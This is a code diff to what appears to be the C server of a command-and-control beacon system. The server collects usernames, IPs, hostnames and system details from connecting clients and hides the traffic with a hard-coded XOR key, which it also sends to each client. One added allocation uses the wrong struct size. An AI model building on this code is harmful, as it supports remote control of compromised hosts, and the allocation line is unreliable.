@@ -23,6 +23,8 @@
 #include <stdbool.h>
 #include <string.h>
 #include "../net.h"
+#include "../crypt.h"
+#include "../defs.h"
 
 bool net_start_server(int port){
   /*
@@ -44,11 +46,9 @@ bool net_start_server(int port){
   // setup socket
   server_fd = socket(AF_INET, SOCK_STREAM, 0);
   if (server_fd < 0){
-    fprintf(stderr, "[-] server error creating socket\n");
+    fprintf(stderr, "[x] server error creating socket\n");
     return false;
   }
-
-  
 
   // set server properties
   memset(&server, 0, sizeof(server));
@@ -59,7 +59,7 @@ bool net_start_server(int port){
   // bind to socket
   err = bind(server_fd, (struct sockaddr *) &server, sizeof(server));
   if (err < 0){
-    fprintf(stderr, "[-] bind to socket failed\n");
+    fprintf(stderr, "[x] bind to socket failed\n");
     return false;
   }
 
@@ -84,6 +84,7 @@ bool net_start_server(int port){
     }
     if ((child_pid = fork()) == 0){
       net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));
+      net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_client_beacon_t));
       while (true){
         close(server_fd);
         int read = recv(client_fd, p_net_client_beacon, sizeof(net_client_beacon_t), 0);
@@ -94,6 +95,7 @@ bool net_start_server(int port){
           fprintf(stderr, "[-] %s:%d read failed\n", inet_ntoa(client.sin_addr), ntohs(client.sin_port));
           return false;
         }
+        crypt_decrypt_xor((void *)p_net_client_beacon, sizeof(net_client_beacon_t), DEFS_XOR_KEY);
         printf("[+] user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n",
                p_net_client_beacon->sysinfo.username,
                p_net_client_beacon->sysinfo.ip,
@@ -102,10 +104,14 @@ bool net_start_server(int port){
                p_net_client_beacon->sysinfo.release,
                p_net_client_beacon->sysinfo.cpu_usage);
         fflush(stdout);
-        if (send(client_fd, data, sizeof(data), 0) < 0){
+        p_net_server_beacon->xor_key = DEFS_XOR_KEY;
+        p_net_server_beacon->status = true;
+        crypt_encrypt_xor((void *)p_net_server_beacon, sizeof(net_server_beacon_t), DEFS_XOR_KEY);
+        if (send(client_fd, p_net_server_beacon, sizeof(net_server_beacon_t), 0) < 0){
           fprintf(stderr, "[-] send data to client failed!\n");
           return false;
         }
+        memset(p_net_server_beacon, 0, sizeof(net_server_beacon_t));
       }
     }
   }
